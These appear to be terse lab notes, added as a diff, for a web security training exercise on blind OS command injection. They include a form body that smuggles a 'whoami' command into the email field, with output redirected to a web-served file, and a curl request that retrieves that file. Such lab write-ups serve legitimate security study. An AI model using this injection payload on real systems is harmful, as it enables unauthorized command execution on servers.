@@ -1,0 +1,16 @@
+
+1. Confirm blind command injection
+- email field
+
+2. Check where images are store
+
+3. Redirect output to file
+
+csrf=06blYTgBkX8wKtDnrDdIDTcwHqQNBkcx&name=test&email=test%40test.com+%26+whoami+>+/var/www/images/.hacked.txt+%23&subject=test&message=test
+
+4. Check if file was created
+
+curl -i -s -k -X $'GET' \
+    -H $'Host: 0abd00fb043d2c50819e3e9d00020055.web-security-academy.net' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0' -H $'Accept: image/avif,image/webp,*/*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: https://0abd00fb043d2c50819e3e9d00020055.web-security-academy.net/' -H $'Sec-Fetch-Dest: image' -H $'Sec-Fetch-Mode: no-cors' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Gpc: 1' -H $'Te: trailers' \
+    -b $'session=uO7dsSQEj1K4vWPs3YqTedjmWJWuhgOd' \
+    $'https://0abd00fb043d2c50819e3e9d00020055.web-security-academy.net/image?filename=.hacked.txt'
